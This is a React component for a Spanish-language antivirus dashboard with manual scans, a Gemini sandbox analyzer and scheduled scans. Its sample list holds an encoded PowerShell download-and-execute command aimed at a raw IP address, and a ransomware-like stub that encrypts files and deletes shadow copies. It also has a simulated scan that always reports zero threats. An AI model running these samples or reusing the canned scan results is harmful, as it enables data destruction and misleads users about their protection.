import React, { useState } from 'react';
import { 
  ShieldCheck, 
  FileSearch, 
  Sparkles, 
  Clock, 
  Play, 
  Pause, 
  CheckCircle2, 
  AlertTriangle, 
  Lock, 
  Cpu, 
  Plus, 
  Trash2, 
  Loader2, 
  Code,
  FileText
} from 'lucide-react';
import { ScanSchedule, ThreatItem, AiThreatAnalysisResult } from '../types';

interface RealtimeScannerProps {
  schedules: ScanSchedule[];
  onAddSchedule: (schedule: ScanSchedule) => void;
  onDeleteSchedule: (id: string) => void;
  onToggleScheduleStatus: (id: string) => void;
  onThreatDetectedFromScan: (threat: ThreatItem) => void;
}

const SAMPLE_SCRIPTS = [
  {
    name: 'ps_obfuscated_download.ps1',
    category: 'Zero-Day Script',
    type: 'PowerShell Payload',
    code: `powershell -nop -w hidden -e aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADQALwBiAGUAYQBjAG8AbgAnACkA`
  },
  {
    name: 'ransomware_locker_stub.exe',
    category: 'Ransomware',
    type: 'Executable Binary',
    code: `import os, sys, crypto
def encrypt_volume(drive="C:\\"):
    for root, dirs, files in os.walk(drive):
        for f in files:
            if f.endswith(('.doc', '.pdf', '.xlsx', '.png')):
                crypto.aes_encrypt(os.path.join(root, f), key="RSA_4096_PRIV")
    os.system("vssadmin delete shadows /all /quiet")`
  },
  {
    name: 'clean_backup_automation.py',
    category: 'Limpio',
    type: 'Python Script',
    code: `import datetime, shutil, logging
def run_nightly_backup(source="/var/www/data", target="/mnt/backups/daily"):
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    archive_name = f"backup_{timestamp}.tar.gz"
    shutil.make_archive(target, 'gztar', source)
    logging.info(f"Backup completed cleanly: {archive_name}")`
  }
];

export const RealtimeScannerView: React.FC<RealtimeScannerProps> = ({
  schedules,
  onAddSchedule,
  onDeleteSchedule,
  onToggleScheduleStatus,
  onThreatDetectedFromScan
}) => {
  // Watchdog toggle
  const [realtimeWatchdogActive, setRealtimeWatchdogActive] = useState<boolean>(true);

  // Manual Scan States
  const [activeScanType, setActiveScanType] = useState<'Quick' | 'Deep' | 'Memory' | 'Network'>('Quick');
  const [isScanning, setIsScanning] = useState<boolean>(false);
  const [scanProgressPct, setScanProgressPct] = useState<number>(0);
  const [currentScannedPath, setCurrentScannedPath] = useState<string>('');
  const [scannedFilesCount, setScannedFilesCount] = useState<number>(0);
  const [scanResultNotice, setScanResultNotice] = useState<string | null>(null);

  // AI Sandbox States
  const [aiInputCode, setAiInputCode] = useState<string>('');
  const [aiInputFilename, setAiInputFilename] = useState<string>('');
  const [aiAnalyzing, setAiAnalyzing] = useState<boolean>(false);
  const [aiAnalysisResult, setAiAnalysisResult] = useState<AiThreatAnalysisResult | null>(null);

  // New Schedule Modal Form
  const [showScheduleModal, setShowScheduleModal] = useState<boolean>(false);
  const [newSchName, setNewSchName] = useState<string>('');
  const [newSchType, setNewSchType] = useState<'Quick' | 'Deep' | 'Memory' | 'Network'>('Quick');
  const [newSchFreq, setNewSchFreq] = useState<'Daily' | 'Weekly' | 'Custom Cron'>('Daily');
  const [newSchTime, setNewSchTime] = useState<string>('09:00 AM');
  const [newSchCpuLimit, setNewSchCpuLimit] = useState<number>(5);

  // Trigger On-Demand Scan
  const handleStartScan = () => {
    setIsScanning(true);
    setScanProgressPct(0);
    setScannedFilesCount(0);
    setScanResultNotice(null);

    const paths = [
      'C:\\Windows\\System32\\kernel32.dll',
      'C:\\Users\\Admin\\AppData\\Local\\Temp\\setup_bin.exe',
      'RAM::KernelProcessTable',
      'C:\\ProgramData\\Microsoft\\Defender',
      'C:\\Windows\\System32\\drivers\\etc\\hosts',
      'SMB::SharedFolder1',
      'Registry::HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    ];

    let currentStep = 0;
    const interval = setInterval(() => {
      currentStep += 1;
      const progress = Math.min(100, currentStep * 12);
      setScanProgressPct(progress);
      setScannedFilesCount(prev => prev + Math.floor(Math.random() * 450 + 120));
      setCurrentScannedPath(paths[currentStep % paths.length]);

      if (progress >= 100) {
        clearInterval(interval);
        setIsScanning(false);
        setScanResultNotice('Escaneo completado. 0 amenazas no resueltas. Rendimiento de CPU mantenido por debajo del 1.2%.');
      }
    }, 400);
  };

  // Run Gemini AI Analysis via Server Endpoint
  const handleAnalyzeWithAi = async () => {
    if (!aiInputCode.trim() && !aiInputFilename.trim()) {
      alert('Por favor introduce un fragmento de código, script o archivo para analizar.');
      return;
    }

    setAiAnalyzing(true);
    setAiAnalysisResult(null);

    try {
      const response = await fetch('/api/security/ai-analyze', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          filename: aiInputFilename || 'script_sandbox.ps1',
          content: aiInputCode,
          threatType: 'Sandbox Inspection'
        })
      });

      const data = await response.json();
      setAiAnalysisResult(data);
    } catch (err) {
      console.error('Error fetching AI analysis:', err);
      alert('Ocurrió un error al conectar con el motor de IA de Gemini.');
    } finally {
      setAiAnalyzing(false);
    }
  };

  // Add New Scheduled Scan
  const handleCreateSchedule = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newSchName.trim()) return;

    const newSchedule: ScanSchedule = {
      id: `SCH-${Math.floor(100 + Math.random() * 900)}`,
      name: newSchName,
      type: newSchType,
      frequency: newSchFreq,
      scheduledTime: newSchTime,
      nextRun: '2026-07-23 ' + newSchTime,
      status: 'Active',
      cpuPriorityLimitPct: newSchCpuLimit,
      autoQuarantine: true,
      targetPaths: ['C:\\System', 'RAM', 'UserProfiles']
    };

    onAddSchedule(newSchedule);
    setShowScheduleModal(false);
    setNewSchName('');
  };

  return (
    <div className="space-y-6">
      
      {/* Real-time Watchdog Master Switch Banner */}
      <div className="bg-slate-900 border border-slate-800 p-5 rounded-2xl shadow-xl flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
        <div className="flex items-center gap-3.5">
          <div className={`p-3 rounded-2xl transition-all ${
            realtimeWatchdogActive
              ? 'bg-emerald-950 text-emerald-400 border border-emerald-800/80 shadow-lg shadow-emerald-950/50'
              : 'bg-slate-800 text-slate-400 border border-slate-700'
          }`}>
            <ShieldCheck className="w-6 h-6" />
          </div>
          <div>
            <div className="text-base font-bold text-white flex items-center gap-2">
              Escudo de Protección en Tiempo Real
              <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold border ${
                realtimeWatchdogActive ? 'bg-emerald-950 text-emerald-300 border-emerald-800' : 'bg-slate-800 text-slate-400 border-slate-700'
              }`}>
                {realtimeWatchdogActive ? 'ACTIVO (0.8% CPU)' : 'DESACTIVADO'}
              </span>
            </div>
            <p className="text-xs text-slate-400 mt-0.5">
              Inspección en tiempo real de llamadas al sistema, creación de procesos e inyecciones DLL en segundo plano.
            </p>
          </div>
        </div>

        <button
          onClick={() => setRealtimeWatchdogActive(!realtimeWatchdogActive)}
          className={`px-4 py-2 rounded-xl text-xs font-bold transition-all border ${
            realtimeWatchdogActive
              ? 'bg-slate-800 hover:bg-slate-700 text-slate-200 border-slate-700'
              : 'bg-emerald-600 hover:bg-emerald-500 text-white border-emerald-500 shadow-md'
          }`}
        >
          {realtimeWatchdogActive ? 'Pausar Protección' : 'Activar Protección'}
        </button>
      </div>

      {/* On-Demand Scan Engine Card */}
      <div className="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-xl space-y-5">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <h2 className="text-base font-bold text-white flex items-center gap-2">
              <FileSearch className="w-5 h-5 text-cyan-400" />
              Escáner Manual Bajo Demanda
            </h2>
            <p className="text-xs text-slate-400">
              Ejecute escaneos instantáneos con aceleración de subprocesos ligeros.
            </p>
          </div>

          {/* Scan Type Picker */}
          <div className="flex items-center gap-1.5 bg-slate-950 p-1 rounded-xl border border-slate-800 text-xs">
            {(['Quick', 'Deep', 'Memory', 'Network'] as const).map((st) => (
              <button
                key={st}
                disabled={isScanning}
                onClick={() => setActiveScanType(st)}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                  activeScanType === st
                    ? 'bg-cyan-600 text-white shadow-md'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                {st === 'Quick' ? 'Rápido' : st === 'Deep' ? 'Profundo' : st === 'Memory' ? 'Memoria' : 'Red'}
              </button>
            ))}
          </div>
        </div>

        {/* Scan Progress Display */}
        {isScanning && (
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-3">
            <div className="flex items-center justify-between text-xs text-slate-300 font-medium">
              <span className="flex items-center gap-2 text-cyan-400">
                <Loader2 className="w-4 h-4 animate-spin" />
                Escaneando módulos de sistema... ({scanProgressPct}%)
              </span>
              <span className="font-mono text-slate-400">{scannedFilesCount.toLocaleString()} archivos inspecionados</span>
            </div>

            {/* Progress Bar */}
            <div className="w-full bg-slate-800 h-2.5 rounded-full overflow-hidden">
              <div 
                className="bg-gradient-to-r from-cyan-500 to-blue-500 h-full rounded-full transition-all duration-300"
                style={{ width: `${scanProgressPct}%` }}
              />
            </div>

            <div className="text-[11px] font-mono text-slate-500 truncate">
              Ruta actual: <span className="text-slate-300">{currentScannedPath}</span>
            </div>
          </div>
        )}

        {/* Scan Notice */}
        {scanResultNotice && (
          <div className="p-3.5 rounded-xl bg-emerald-950/80 border border-emerald-800 text-emerald-300 text-xs flex items-center gap-2">
            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
            <span>{scanResultNotice}</span>
          </div>
        )}

        <div className="flex justify-end">
          <button
            disabled={isScanning}
            onClick={handleStartScan}
            className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-semibold text-xs shadow-lg shadow-cyan-950/60 transition-all disabled:opacity-50"
          >
            {isScanning ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" /> Escaneando...
              </>
            ) : (
              <>
                <Play className="w-4 h-4 fill-current" /> Iniciar Escaneo ({activeScanType})
              </>
            )}
          </button>
        </div>
      </div>

      {/* Gemini AI Sandbox Code & File Analyzer */}
      <div className="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-xl space-y-5">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <h2 className="text-base font-bold text-white flex items-center gap-2">
              <Sparkles className="w-5 h-5 text-indigo-400" />
              Sandbox de Inspección Forense con Gemini AI
            </h2>
            <p className="text-xs text-slate-400">
              Pegue scripts sospechosos, cargas útiles ofuscadas o selecciones muestras predefinidas para un análisis en profundidad.
            </p>
          </div>

          {/* Sample preset selector */}
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-xs text-slate-400">Cargar muestra:</span>
            {SAMPLE_SCRIPTS.map((s) => (
              <button
                key={s.name}
                onClick={() => {
                  setAiInputFilename(s.name);
                  setAiInputCode(s.code);
                }}
                className="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 text-[11px] font-mono transition-all"
              >
                {s.name}
              </button>
            ))}
          </div>
        </div>

        {/* Form Inputs */}
        <div className="space-y-3">
          <div className="flex flex-col sm:flex-row gap-3">
            <input
              type="text"
              placeholder="Nombre del archivo o proceso (ej: script_suspicious.ps1)"
              value={aiInputFilename}
              onChange={(e) => setAiInputFilename(e.target.value)}
              className="flex-1 bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-indigo-500"
            />
          </div>

          <textarea
            rows={5}
            placeholder="Pegue aquí el código, script PowerShell, comandos o muestra binaria ofuscada..."
            value={aiInputCode}
            onChange={(e) => setAiInputCode(e.target.value)}
            className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3.5 text-xs font-mono text-slate-200 placeholder-slate-600 focus:outline-none focus:border-indigo-500 leading-relaxed"
          />

          <div className="flex justify-end">
            <button
              disabled={aiAnalyzing}
              onClick={handleAnalyzeWithAi}
              className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-500 hover:to-purple-500 text-white font-semibold text-xs shadow-lg shadow-indigo-950/50 transition-all disabled:opacity-50"
            >
              {aiAnalyzing ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" /> Analizando con Gemini AI...
                </>
              ) : (
                <>
                  <Sparkles className="w-4 h-4" /> Analizar Amenaza con IA
                </>
              )}
            </button>
          </div>
        </div>

        {/* AI Analysis Result Display Card */}
        {aiAnalysisResult && (
          <div className="bg-slate-950 border border-indigo-900/60 p-5 rounded-xl space-y-4 shadow-inner">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="flex items-center gap-3">
                <div className={`p-2.5 rounded-xl font-mono font-bold text-sm ${
                  aiAnalysisResult.riskScore >= 70 ? 'bg-red-950 text-red-400 border border-red-800' : 'bg-emerald-950 text-emerald-400 border border-emerald-800'
                }`}>
                  {aiAnalysisResult.riskScore}/100
                </div>
                <div>
                  <h3 className="text-sm font-bold text-white">{aiAnalysisResult.threatName}</h3>
                  <p className="text-xs text-slate-400">Veredicto: <span className="font-semibold text-indigo-300">{aiAnalysisResult.verdict}</span> | Categoría: {aiAnalysisResult.category}</p>
                </div>
              </div>
              <span className="text-[10px] font-mono text-slate-500">{aiAnalysisResult.analysisTimestamp}</span>
            </div>

            <div className="space-y-2 text-xs">
              <div className="font-semibold text-slate-300">Detalles Técnicos:</div>
              <p className="text-slate-400 leading-relaxed bg-slate-900 p-3 rounded-lg border border-slate-800 font-sans">
                {aiAnalysisResult.technicalDetails}
              </p>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
              {/* IoC List */}
              <div className="space-y-1.5">
                <div className="font-semibold text-slate-300 flex items-center gap-1.5">
                  <AlertTriangle className="w-3.5 h-3.5 text-amber-400" /> Indicadores de Compromiso (IoCs):
                </div>
                <ul className="list-disc list-inside space-y-1 text-slate-400 bg-slate-900 p-3 rounded-lg border border-slate-800 font-mono text-[11px]">
                  {aiAnalysisResult.indicatorsOfCompromise.map((ioc, idx) => (
                    <li key={idx} className="truncate">{ioc}</li>
                  ))}
                </ul>
              </div>

              {/* Recommended Actions */}
              <div className="space-y-1.5">
                <div className="font-semibold text-slate-300 flex items-center gap-1.5">
                  <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" /> Remediación Recomendada:
                </div>
                <ul className="list-disc list-inside space-y-1 text-slate-400 bg-slate-900 p-3 rounded-lg border border-slate-800 text-[11px]">
                  {aiAnalysisResult.recommendedActions.map((act, idx) => (
                    <li key={idx}>{act}</li>
                  ))}
                </ul>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Scheduled Scans Manager */}
      <div className="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-xl space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <h2 className="text-base font-bold text-white flex items-center gap-2">
              <Clock className="w-5 h-5 text-cyan-400" />
              Gestión de Escaneos Programados
            </h2>
            <p className="text-xs text-slate-400">
              Configure tareas automáticas periódicas con límites estrictos de prioridad de CPU para cero lag.
            </p>
          </div>

          <button
            onClick={() => setShowScheduleModal(true)}
            className="flex items-center gap-2 px-3.5 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-cyan-300 border border-slate-700 text-xs font-semibold transition-all shrink-0"
          >
            <Plus className="w-4 h-4" /> Programar Nuevo Escaneo
          </button>
        </div>

        {/* Schedules Table */}
        <div className="overflow-x-auto rounded-xl border border-slate-800">
          <table className="w-full text-left text-xs text-slate-300">
            <thead className="bg-slate-950 text-slate-400 text-[11px] uppercase tracking-wider border-b border-slate-800">
              <tr>
                <th className="py-3 px-4">Tarea & Tipo</th>
                <th className="py-3 px-4">Frecuencia</th>
                <th className="py-3 px-4">Próxima Ejecución</th>
                <th className="py-3 px-4">Límite CPU (Zero-Lag)</th>
                <th className="py-3 px-4">Estado</th>
                <th className="py-3 px-4 text-right">Acciones</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60 font-sans">
              {schedules.map((sch) => (
                <tr key={sch.id} className="hover:bg-slate-800/40 transition-colors">
                  <td className="py-3 px-4">
                    <div className="font-semibold text-white">{sch.name}</div>
                    <div className="text-[10px] text-slate-500 font-mono">{sch.type} Scan • {sch.id}</div>
                  </td>

                  <td className="py-3 px-4 font-medium text-slate-300">
                    {sch.frequency} ({sch.scheduledTime})
                  </td>

                  <td className="py-3 px-4 font-mono text-slate-400">
                    {sch.nextRun}
                  </td>

                  <td className="py-3 px-4">
                    <span className="font-mono text-emerald-400 font-semibold">Max {sch.cpuPriorityLimitPct}% CPU</span>
                  </td>

                  <td className="py-3 px-4">
                    <span className={`px-2 py-0.5 text-[10px] font-bold rounded border ${
                      sch.status === 'Active' ? 'bg-emerald-950 text-emerald-300 border-emerald-800' : 'bg-slate-800 text-slate-400 border-slate-700'
                    }`}>
                      {sch.status === 'Active' ? 'ACTIVO' : 'PAUSADO'}
                    </span>
                  </td>

                  <td className="py-3 px-4 text-right">
                    <div className="flex items-center justify-end gap-2">
                      <button
                        onClick={() => onToggleScheduleStatus(sch.id)}
                        className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300"
                        title={sch.status === 'Active' ? 'Pausar' : 'Activar'}
                      >
                        {sch.status === 'Active' ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
                      </button>

                      <button
                        onClick={() => onDeleteSchedule(sch.id)}
                        className="p-1.5 rounded-lg bg-slate-800 hover:bg-red-950 text-slate-400 hover:text-red-300"
                        title="Eliminar programación"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Modal: Create Scheduled Scan */}
      {showScheduleModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl max-w-md w-full p-6 space-y-4 text-slate-200">
            <h3 className="text-base font-bold text-white">Programar Nuevo Escaneo Automático</h3>

            <form onSubmit={handleCreateSchedule} className="space-y-4 text-xs">
              <div>
                <label className="block text-slate-400 mb-1">Nombre de la Tarea</label>
                <input
                  type="text"
                  required
                  placeholder="ej: Escaneo Nocturno de Archivos de Red"
                  value={newSchName}
                  onChange={(e) => setNewSchName(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-white focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-slate-400 mb-1">Tipo de Escaneo</label>
                  <select
                    value={newSchType}
                    onChange={(e) => setNewSchType(e.target.value as any)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-white focus:outline-none"
                  >
                    <option value="Quick">Rápido</option>
                    <option value="Deep">Profundo</option>
                    <option value="Memory">Memoria</option>
                    <option value="Network">Red</option>
                  </select>
                </div>

                <div>
                  <label className="block text-slate-400 mb-1">Frecuencia</label>
                  <select
                    value={newSchFreq}
                    onChange={(e) => setNewSchFreq(e.target.value as any)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-white focus:outline-none"
                  >
                    <option value="Daily">Diario</option>
                    <option value="Weekly">Semanal</option>
                    <option value="Custom Cron">Personalizado</option>
                  </select>
                </div>
              </div>

              <div>
                <label className="block text-slate-400 mb-1">
                  Límite de Uso de CPU para Cero Lag ({newSchCpuLimit}%)
                </label>
                <input
                  type="range"
                  min={1}
                  max={20}
                  value={newSchCpuLimit}
                  onChange={(e) => setNewSchCpuLimit(Number(e.target.value))}
                  className="w-full accent-cyan-500"
                />
                <div className="flex justify-between text-[10px] text-slate-500">
                  <span>1% (Ultra Cero Impacto)</span>
                  <span>20% (Rápido)</span>
                </div>
              </div>

              <div className="flex justify-end gap-2 pt-2">
                <button
                  type="button"
                  onClick={() => setShowScheduleModal(false)}
                  className="px-4 py-2 rounded-xl bg-slate-800 text-slate-300 font-semibold"
                >
                  Cancelar
                </button>

                <button
                  type="submit"
                  className="px-4 py-2 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-white font-semibold"
                >
                  Guardar Programación
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

    </div>
  );
};
